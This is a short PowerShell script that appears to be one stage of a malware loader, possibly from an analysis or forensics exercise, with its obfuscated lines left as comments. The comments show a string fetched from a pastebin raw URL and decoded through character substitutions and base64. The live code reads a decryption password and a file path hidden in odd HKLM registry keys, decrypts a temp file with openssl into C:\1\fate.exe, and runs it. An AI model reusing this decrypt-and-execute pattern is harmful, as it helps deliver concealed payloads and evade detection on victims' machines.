#$SCOP = ((new-object System.Net.WebClient).DownloadString("https://pastebin.com/raw/rBXHdE85")).Replace("!","f").Replace("@","q").Replace("#","z").Replace("<","B").Replace("%","K").Replace("^","O").Replace("&","T").Replace("*","Y").Replace("[","4").Replace("]","9").Replace("{","=");
#$SCOP = "SEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcVGFibGV0UENcQmVsbA==";
#$SLPH = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($SCOP));
$SLPH = "HKLM:\SOFTWARE\Microsoft\Windows\TabletPC\Bell"
$E = (Get-ItemProperty -Path $SLPH -Name Blast)."Blast";
# $E = "M4RK_MY_W0Rd5"



#$TWR = "!M[[pcU09%d^kV&l#9*0XFd]cVG93<".Replace("!","SEt").Replace("@","q").Replace("#","jcm").Replace("<","ZXI=").Replace("%","GVF").Replace("^","BU").Replace("&","cTW").Replace("*","zb2Z").Replace("[","T").Replace("]","iZW1").Replace("{","Fdi");
#$TWR = "SEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdiZW1cVG93ZXI=";
#$BRN = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($TWR));
$BRN = "HKLM:\SOFTWARE\Microsoft\Wbem\Tower";
$D = (Get-ItemProperty -Path $BRN -Name Off)."Off";
# $D = "\\EOTW\\151.txt"

openssl aes-256-cbc -a -A -d -salt -md sha256 -in $env:temp$D -pass pass:$E -out "c:\1\fate.exe";

C:\1\fate.exe;